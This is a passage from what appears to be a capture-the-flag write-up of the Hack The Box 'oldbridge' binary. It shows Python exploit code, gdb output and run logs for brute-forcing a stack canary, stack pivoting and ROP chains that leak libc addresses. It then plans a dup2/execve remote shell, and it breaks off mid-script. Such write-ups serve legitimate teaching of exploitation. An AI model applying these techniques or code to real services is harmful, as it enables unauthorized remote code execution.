+</span></span><span style="display:flex;"><span>    old_rbp <span style="color:#f92672">=</span> leak_n_bytes(payload <span style="color:#f92672">+</span> canary, <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Leaking return address&#34;</span>
+</span></span><span style="display:flex;"><span>    ret_addr <span style="color:#f92672">=</span> leak_n_bytes(payload <span style="color:#f92672">+</span> canary <span style="color:#f92672">+</span> old_rbp <span style="color:#f92672">+</span> chr(ord(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcf</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xd</span>), <span style="color:#ae81ff">7</span>)
+</span></span></code></pre></div><pre tabindex="0"><code>$ python exploit.py 
+Leaking canary
+Found: 0xd
+Found: 0xc0
+Found: 0x2a
+Found: 0xf7
+Found: 0x4c
+Found: 0xf6
+Found: 0x34
+Found: 0x5d
+Leaking old RBP
+Found: 0x5d
+Found: 0xf6
+Found: 0x2b
+Found: 0xad
+Found: 0xf2
+Found: 0x72
+Found: 0xd
+Found: 0xd
+Leaking return address
+Found: 0x13
+Found: 0xe9
+Found: 0x6e
+Found: 0xad
+Found: 0x58
+Found: 0xd
+Found: 0xd
+Found: 0x0
+</code></pre><p>What we have so far:</p>
+<ol>
+<li>
+<p>Using the return address we can now learn the <strong>start of the .text section</strong>. We can use gadgets from there, as well as jumping to the @plt of functions there and probably use the Global Offset Table for libc functions to leak libc addresses</p>
+</li>
+<li>
+<p>Using the RBP, we can learn <strong>the address of our buffer on the stack</strong> because the offset from the old rbp and our stack will be fixed regardless of the starting address of the stack section in memory.</p>
+</li>
+</ol>
+<p>Let&rsquo;s start by computing the address of our buffer on the stack. By looking at the server, when the server <code>read</code>s our input to <code>0x7fffffffe110</code>:</p>
+<pre tabindex="0"><code>=&gt; 0x555555554bc9 &lt;check_username+90&gt;:	call   0x555555554970 &lt;read@plt&gt;
+   0x555555554bce &lt;check_username+95&gt;:	mov    DWORD PTR [rbp-0x414],eax
+   0x555555554bd4 &lt;check_username+101&gt;:	mov    DWORD PTR [rbp-0x418],0x0
+   0x555555554bde &lt;check_username+111&gt;:	jmp    0x555555554c0b &lt;check_username+156&gt;
+   0x555555554be0 &lt;check_username+113&gt;:	mov    eax,DWORD PTR [rbp-0x418]
+Guessed arguments:
+arg[0]: 0x4 
+arg[1]: 0x7fffffffe110 --&gt; 0x7ffff7ffe4c8 --&gt; 0x7ffff7ffe428 --&gt; 0x7ffff7ff1510 --&gt; 0x7ffff7ffe170 --&gt; 0x555555554000 (--&gt; ...)
+arg[2]: 0x420 
+</code></pre><p>And if we check out the old rbp value (at the bottom of the stack frame), we can check that value by looking at where our current <code>rbp</code> is pointing to <code>0x00007fffffffe590</code>:</p>
+<pre tabindex="0"><code>gdb-peda$ x/4gx $rbp
+0x7fffffffe520:	0x00007fffffffe590	0x0000555555554ecf
+0x7fffffffe530:	0x00007fffffffe678	0x00000002f7dd7660
+gdb-peda$ x/16gx $rbp-0x20
+0x7fffffffe500:	0x4242424242424242	0x4242424242424242
+0x7fffffffe510:	0x4242424242424242	0xc68342c2b57a9500
+0x7fffffffe520:	0x00007fffffffe590	0x0000555555554ecf
+0x7fffffffe530:	0x00007fffffffe678	0x00000002f7dd7660
+0x7fffffffe540:	0x00007fffffffe5a8	0x0000000100000010
+0x7fffffffe550:	0x0000001000000539	0x0000000000000004
+0x7fffffffe560:	0x0000000039050002	0x0000000000000000
+0x7fffffffe570:	0x010011ac589b0002	0x0000000000000000
+</code></pre><p>The distance from old rbp <code>0x00007fffffffe590</code> to our buffer <code>0x7fffffffe110</code> is <code>0x480</code>.</p>
+<p>Moving on to the .text section, we leaked a specific address of an instruction inside the <code>main</code> function (the one that ends with <code>0xcf</code>).<!-- raw HTML omitted -->
+We can again go back to our server to see the offset of that value from the start of the section</p>
+<pre tabindex="0"><code>gdb-peda$ bt
+#0  0x0000555555554bce in check_username ()
+#1  0x0000555555554ecf in main ()
+#2  0x00007ffff7a05b97 in __libc_start_main (main=0x555555554c99 &lt;main&gt;, argc=0x2, argv=0x7fffffffe678, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, 
+    rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe668) at ../csu/libc-start.c:310
+#3  0x0000555555554a5a in _start ()
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x0000555555554000 0x0000555555556000 r-xp	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
+0x0000555555755000 0x0000555555756000 r--p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
+0x0000555555756000 0x0000555555757000 rw-p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
+0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bcb000 0x00007ffff7dcb000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcb000 0x00007ffff7dcf000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcf000 0x00007ffff7dd1000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dd1000 0x00007ffff7dd5000 rw-p	mapped
+0x00007ffff7dd5000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ff1000 0x00007ffff7ff3000 rw-p	mapped
+0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+</code></pre><p>So the distance between the return address <code>0x0000555555554bce</code> and the start of the section <code>0x0000555555554000</code> is exactly <code>0xbce</code> bytes.</p>
+<p>We now have the code section start, as well as the start of our buffer on the stack. The next step that I usually take is to go towards a libc leak and figure out the libc version, but here&rsquo;s where our big problem lies: <strong>we have not space for a ROP chain!</strong> as we cannot override past the return address, what do we do?</p>
+<h3 id="stack-pivoting-create-your-own-stack">Stack pivoting, create your own stack</h3>
+<p>Stack pivoting is a fancy name for replacing the program&rsquo;s <code>rsp</code> with a pointer to some area in the memory which you control, how does that help us?</p>
+<p>Well, since the end of the <code>check_username</code> function is a <code>ret</code> instruction, what if we could control the stack pointer to point to somewhere inside our buffer? we would be able to control that <code>ret</code>!</p>
+<p>To do so we need to change the <code>rsp</code>, and we have only 1 jump that we can control in order to get it.</p>
+<h3 id="the-leave-instruction">The LEAVE instruction</h3>
+<p>The <a href="https://c9x.me/x86/html/file_module_x86_id_154.html">leave</a> instruction which is present at the end of the function restores the old stack pointer of the previous frame. The instruction is &ldquo;leaving&rdquo; the current frame.<!-- raw HTML omitted -->
+To do so first: it perform <code>rsp = rbp</code>. Restoring the <code>rsp</code> to the value from the previous frame.<!-- raw HTML omitted -->
+I like to think of <code>leave</code> as the &ldquo;<code>ret</code>&rdquo; instruction of the stack.</p>
+<p>Great, so if we <code>ret</code> to the <code>leave</code> instruction again (1 instruction above the original <code>ret</code>), we are basically &ldquo;popping&rdquo; the rbp again effectively changing the <code>rsp</code> to the value of our choosing!<!-- raw HTML omitted -->
+All that is required of us is to change the return address to the <code>leave</code> instruction. After which the program will execute the <code>leave</code> and then the <code>ret</code>. The <code>ret</code> now will return to a value at the stop of the stack, which <strong>is the custom stack now</strong></p>
+<p>If we send the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    text_section_base <span style="color:#f92672">=</span> ret_addr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
+</span></span><span style="display:flex;"><span>    text_section_leave_ret <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc5c</span>
+</span></span><span style="display:flex;"><span>    buffer_addr       <span style="color:#f92672">=</span> old_rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x480</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># After leaking the necessary values,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We create a new payload</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;AA&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Pad to the end of buffer</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(canary <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(buffer_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(text_section_leave_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    send_payload(payload)
+</span></span></code></pre></div><p>We get:</p>
+<pre tabindex="0"><code>   0x555555554c5c &lt;check_username+237&gt;:	leave  
+=&gt; 0x555555554c5d &lt;check_username+238&gt;:	ret    
+   0x555555554c5e &lt;exit_server&gt;:	push   rbp
+   0x555555554c5f &lt;exit_server+1&gt;:	mov    rbp,rsp
+   0x555555554c62 &lt;exit_server+4&gt;:	sub    rsp,0x20
+   0x555555554c66 &lt;exit_server+8&gt;:	mov    DWORD PTR [rbp-0x14],edi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe118 --&gt; 0xdeadbeefdeadbeef 
+0008| 0x7fffffffe120 (&#39;O&#39; &lt;repeats 200 times&gt;...)
+0016| 0x7fffffffe128 (&#39;O&#39; &lt;repeats 200 times&gt;...)
+0024| 0x7fffffffe130 (&#39;O&#39; &lt;repeats 200 times&gt;...)
+0032| 0x7fffffffe138 (&#39;O&#39; &lt;repeats 200 times&gt;...)
+0040| 0x7fffffffe140 (&#39;O&#39; &lt;repeats 200 times&gt;...)
+0048| 0x7fffffffe148 (&#39;O&#39; &lt;repeats 200 times&gt;...)
+0056| 0x7fffffffe150 (&#39;O&#39; &lt;repeats 200 times&gt;...)
+</code></pre><p>And from here we can write a pretty nice and long ROP chain that can take us where ever we like!</p>
+<h3 id="leaking-an-address-of-a-function-in-libc">Leaking an address of a function in libc</h3>
+<p>My next step usually is to go ahead to leak some entry from the GOT, take that address to some libc-database and then learn the libc version used in the remote machine.</p>
+<p>So let&rsquo;s try that, we&rsquo;ll create a ROP chain to call something like: <code>write(int socket_fd, (void*) buffer_addr, ssize_t length)</code>. The <code>socket_fd</code> can be figured out by looking at our own process&rsquo;s file descriptors:</p>
+<pre tabindex="0"><code>=&gt; 0x555555554bad &lt;check_username+62&gt;:	call   0x555555554910 &lt;write@plt&gt;
+   0x555555554bb2 &lt;check_username+67&gt;:	lea    rcx,[rbp-0x410]
+   0x555555554bb9 &lt;check_username+74&gt;:	mov    eax,DWORD PTR [rbp-0x424]
+   0x555555554bbf &lt;check_username+80&gt;:	mov    edx,0x420
+   0x555555554bc4 &lt;check_username+85&gt;:	mov    rsi,rcx
+Guessed arguments:
+arg[0]: 0x4   &lt;---- file_descriptor
+arg[1]: 0x555555554f94 (&#34;Username: &#34;)
+arg[2]: 0xa (&#39;\n&#39;)
+</code></pre><p>The same fd can be seen when the process is using <code>read</code>:</p>
+<pre tabindex="0"><code>=&gt; 0x555555554bc9 &lt;check_username+90&gt;:	call   0x555555554970 &lt;read@plt&gt;
+   0x555555554bce &lt;check_username+95&gt;:	mov    DWORD PTR [rbp-0x414],eax
+   0x555555554bd4 &lt;check_username+101&gt;:	mov    DWORD PTR [rbp-0x418],0x0
+   0x555555554bde &lt;check_username+111&gt;:	jmp    0x555555554c0b &lt;check_username+156&gt;
+   0x555555554be0 &lt;check_username+113&gt;:	mov    eax,DWORD PTR [rbp-0x418]
+Guessed arguments:
+arg[0]: 0x4 
+arg[1]: 0x7fffffffe110 --&gt; 0x7ffff7ffe4c8 --&gt; 0x7ffff7ffe428 --&gt; 0x7ffff7ff1510 --&gt; 0x7ffff7ffe170 --&gt; 0x555555554000 (--&gt; ...)
+arg[2]: 0x420 
+</code></pre><p>The address we want to leak is some entry in the GOT table. Specifically we&rsquo;ll use <code>write@plt</code> to get the GOT entry of <code>write</code> so we can learn the address of that function in libc after the linker placed it there.</p>
+<pre tabindex="0"><code>gdb-peda$ x/3i 0x555555554910
+   0x555555554910 &lt;write@plt&gt;:	jmp    QWORD PTR [rip+0x20170a]        # 0x555555756020
+   0x555555554916 &lt;write@plt+6&gt;:	push   0x1
+   0x55555555491b &lt;write@plt+11&gt;:	jmp    0x5555555548f0
+gdb-peda$ x/gx 0x555555756020
+0x555555756020:	0x00007ffff7af4140
+gdb-peda$ disas 0x00007ffff7af4140
+Dump of assembler code for function __GI___libc_write:
+   0x00007ffff7af4140 &lt;+0&gt;:	lea    rax,[rip+0x2e07b1]        # 0x7ffff7dd48f8 &lt;__libc_multiple_threads&gt;
+   0x00007ffff7af4147 &lt;+7&gt;:	mov    eax,DWORD PTR [rax]
+   0x00007ffff7af4149 &lt;+9&gt;:	test   eax,eax
+   0x00007ffff7af414b &lt;+11&gt;:	jne    0x7ffff7af4160 &lt;__GI___libc_write+32&gt;
+   0x00007ffff7af414d &lt;+13&gt;:	mov    eax,0x1
+   0x00007ffff7af4152 &lt;+18&gt;:	syscall 
+</code></pre><p>The address we&rsquo;re after is <code>0x555555756020</code> which contains the address of <code>write</code> at libc.
+The address we want to leak is <code>0x555555756020 - libc_base = 0x202020</code> bytes from the start of <code>libc_base</code> <em>which we have already learned</em>.</p>
+<p>Now we know all of our arguments for <code>write</code>:</p>
+<ol>
+<li>File descriptor = 0x4</li>
+<li>Address of buffer: <code>libc_base + 0x202020</code></li>
+<li>Length = 0x8 (We want a QWORD, so 8 bytes)</li>
+<li>The address of the function we want to call: <code>write@plt</code> is <code>libc_base + 0x202020</code> as well and we can call it</li>
+</ol>
+<p>The last thing we need is to find a way to load these argument from the stack to the registers. Because as we remember, the arguments in this binary as <strong>passed via registers</strong>. So we have to find some gadgets in the .text section of the binary that would:</p>
+<ol>
+<li>pop rdi (first argument)</li>
+<li>pop rsi (second argument)</li>
+<li>pop rdx (third argument)</li>
+</ol>
+<pre tabindex="0"><code>gdb-peda$ vmmap
+Start              End                Perm	Name
+0x0000555555554000 0x0000555555556000 r-xp	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
+0x0000555555755000 0x0000555555756000 r--p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
+0x0000555555756000 0x0000555555757000 rw-p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
+0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bcb000 0x00007ffff7dcb000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcb000 0x00007ffff7dcf000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcf000 0x00007ffff7dd1000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dd1000 0x00007ffff7dd5000 rw-p	mapped
+0x00007ffff7dd5000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ff1000 0x00007ffff7ff3000 rw-p	mapped
+0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+gdb-peda$ ropsearch &#34;pop rsi&#34; 0x0000555555554000 0x0000555555556000
+Searching for ROP gadget: &#39;pop rsi&#39; in range: 0x555555554000 - 0x555555556000
+0x0000555555554f71 : (b&#39;5e415fc3&#39;)	pop rsi; pop r15; ret
+gdb-peda$ ropsearch &#34;pop rdi&#34; 0x0000555555554000 0x0000555555556000
+Searching for ROP gadget: &#39;pop rdi&#39; in range: 0x555555554000 - 0x555555556000
+0x0000555555554f73 : (b&#39;5fc3&#39;)	pop rdi; ret
+gdb-peda$ ropsearch &#34;pop rdx&#34; 0x0000555555554000 0x0000555555556000
+Searching for ROP gadget: &#39;pop rdx&#39; in range: 0x555555554000 - 0x555555556000
+0x0000555555554b53 : (b&#39;5ac3&#39;)	pop rdx; ret
+</code></pre><p>Note: if <code>ropsearch</code> doesn&rsquo;t work, you need to <code>apt-get install nasm</code>.</p>
+<p>We&rsquo;ll add these gadgets to our script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf71</span>
+</span></span><span style="display:flex;"><span>gadget_pop_rdi_ret         <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf73</span>
+</span></span><span style="display:flex;"><span>gadget_pop_rdx_ret         <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb53</span>
+</span></span></code></pre></div><p>Note: when we&rsquo;ll use <code>pop_rsi</code>, we have to remember that there&rsquo;s another <code>pop</code> taking place.</p>
+<p>So after leaking the canary, RBP and return address, we construct another payload this time to leak the address of <code>write</code> (by using <code>write</code>! isn&rsquo;t that confusing?)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf71</span>
+</span></span><span style="display:flex;"><span>gadget_pop_rdi_ret         <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf73</span>
+</span></span><span style="display:flex;"><span>gadget_pop_rdx_ret         <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb53</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>text_section_write_got <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x202020</span>
+</span></span><span style="display:flex;"><span>text_section_write_plt <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x910</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># After leaking the necessary values,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># We create a new payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;AA&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(text_section_write_got <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1337</span>)   <span style="color:#75715e"># pop r15, dont-care</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdx_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x8</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(text_section_write_plt <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pad to the end of buffer</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(canary <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(buffer_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(text_section_leave_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)  <span style="color:#75715e"># server hello</span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_libc <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;write@libc:&#34;</span>, hex(unpack(write_libc))
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>Note how <code>text_section_write_got</code> and <code>text_section_write_got</code> are not the same thing! one is an entry in the GOT which is not executable, the other is the PLT stub of <code>write</code>.</p>
+<p>Using this ROP chain we learn:</p>
+<pre tabindex="0"><code>write@libc: 0x7ffff7af4140
+</code></pre><p>Awesome! we can take this offset to some LIBC database and check the libc version, and from there compute other addresses located in this area and ROP our way to a shell</p>
+<h3 id="problem-the-address-cannot-be-found-in-the-databases">Problem, the address cannot be found in the databases!</h3>
+<p>I&rsquo;ve looked in some libc databases, namely <a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a>. And couldn&rsquo;t find the offset I found for <code>write</code> on the remote server in <em>any</em> of the databases that I&rsquo;ve looked.</p>
+<p>I thought I&rsquo;d try a different approach: so I cannot learn the libc version - but who cares? I have control over <code>write</code> and I can plug in what ever address I like there get back a byte from the process&rsquo;s memory. <!-- raw HTML omitted -->
+I can use that to <strong>leak all of the libc pages of the remote server&rsquo;s process</strong> and look for the gadgets I want there. I thought that this might not have been the solution that most of the people who have solved this challenge used. But hey, if it works!</p>
+<h3 id="dumping-the-entire-libc-content-and-looking-for-useful-gadgets">Dumping the entire libc content and looking for useful gadgets</h3>
+<p>My goal is to leak all of the content of libc that is mapped to memory. Memory is mapped in chunks of pages. So I would take the address of <code>write</code> I have just leaked, and from this page I would scan up and down (jumping in size of a page which is usually <code>0x1000 = 4096</code>) and look for stuff I&rsquo;m interested in.</p>
+<p>Since I can control the arguments plugged to functions I don&rsquo;t care about finding &ldquo;/bin/sh&rdquo;, I can just look for <code>system</code> or <code>execve</code>.</p>
+<p>My strategy was to take the first few bytes from <strong>my own libc implementation of functions</strong> and look for them in server&rsquo;s. Using the strategy I couldn&rsquo;t find <code>system</code> as this is a rather large wrapper function that is likely to change between libc versions, but I did find <code>execve</code>.</p>
+<p><code>int execve(const char *path, char *const argv[], char *const envp[]);</code> requires 3 arguments: they other two usually cannot be null and may crash the program it is trying to run, but that is not the case for <code>/bin/sh</code>, this makes things easier even thought it would not have been such a problem delivering the arrays necessary for arguments 2 and 3 (since again, we have control over the stack and can deliver any arguments we like)</p>
+<h3 id="one-last-problem-to-solve">One last problem to solve</h3>
+<p>If we make the remote server execute <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> we&rsquo;re still not there! why?</p>
+<p>The shell is executed, however its inputs and outputs are the file descriptors inherited from the process that called <code>execve</code>, and if we recall - that process has its original standard input and output (file descriptors 0 and 1). And we communicate with the server via file descriptor 4.</p>
+<p>To get around this issue, we&rsquo;d like to replace the STDIN and STDOUT of the process with the file descriptor of the socket (0x4). <!-- raw HTML omitted -->
+To do that, we&rsquo;ll use the <a href="https://linux.die.net/man/2/dup2">dup2</a> system call. dup2() duplicates a file descriptor (the first argument) to a second desired one. So our plan would be to:</p>
+<ol>
+<li><code>close(0)</code> close the STDIN</li>
+<li><code>close(1)</code> close the STDOUT</li>
+<li><code>dup2(4,0)</code> dup our socket&rsquo;s file descriptor to take the place of STDIN</li>
+<li><code>dup2(4,1)</code> same for STDOUT</li>
+</ol>
+<p>This makes our ROP chain a little bit longer, but it&rsquo;s not that terrible as we have a lot of room in our buffer. And eventually, when we&rsquo;ll call <code>execve</code> - we would have complete control ove the shell.</p>
+<h3 id="enough-chat-lets-finish-the-exploit">Enough chat, let&rsquo;s finish the exploit</h3>
+<p>First, we need to find the starting bytes of <code>dup2</code> and <code>execve</code> in our local libc implementation, and look for them in the libc pages dumped from the server. As these are already system calls, we dont need much but something like:</p>
+<pre tabindex="0"><code>mov eax, [SYSCALL_NUM]
+syscall
+</code></pre><p>Let&rsquo;s do this:</p>
+<pre tabindex="0"><code>gdb-peda$ x/8b dup2
+0x7ffff7af49a0 &lt;dup2&gt;:	0xb8	0x21	0x00	0x00	0x00	0x0f	0x05	0x48
+</code></pre><p>Since <code>0x0f 0x05</code> is the <code>syscall</code> instruction, we can just stop there</p>
+<pre tabindex="0"><code>gdb-peda$ x/8b execve
+0x7ffff7ac8e30 &lt;execve&gt;:	0xb8	0x3b	0x00	0x00	0x00	0x0f	0x05	0x48
+</code></pre><p>I wrote something pretty ugly that gets the job done:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libc_page <span style="color:#f92672">=</span> unpack(write_libc) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
+</span></span><span style="display:flex;"><span>page_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
+</span></span><span style="display:flex;"><span>dup2_start      <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0xb8</span>,	<span style="color:#ae81ff">0x21</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x0f</span>,	<span style="color:#ae81ff">0x05</span>]])
+</span></span><span style="display:flex;"><span>execve_start    <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0xb8</span>,	<span style="color:#ae81ff">0x3b</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x0f</span>,	<span style="color:#ae81ff">0x05</span>]])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dup2_remote_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>execve_remote_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># scan down</span>
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;Scanning down&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> dup2_remote_addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> execve_remote_addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
